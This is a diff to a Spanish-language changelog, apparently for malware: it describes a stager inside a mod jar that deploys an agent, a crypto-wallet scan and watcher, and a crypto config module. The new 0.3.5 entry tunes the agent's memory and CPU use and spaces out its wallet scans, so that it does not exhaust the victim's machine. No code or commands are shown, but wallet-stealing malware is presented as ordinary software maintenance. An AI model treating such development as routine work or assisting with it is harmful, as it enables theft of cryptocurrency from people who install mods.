@@ -1,5 +1,10 @@
 # Changelog
 
+## 0.3.5
+
+- El agente arranca con `-Xmx512m` y un máximo de dos hilos de CPU. El scan de wallets retenía los ficheros en memoria y con 96 MiB entraba en GC continuo hasta agotar la máquina.
+- Menos ficheros por scan por defecto y watcher de wallets más espaciado.
+
 ## 0.3.4
 
 - El stager extrae `config.json` del jar del mod a `crypto-config.json` junto al agente. Antes el agente arrancaba sin perfil cripto (`Crypto module disabled`) porque la config solo viajaba en el jar del mod y no dentro de `agent.bin`.
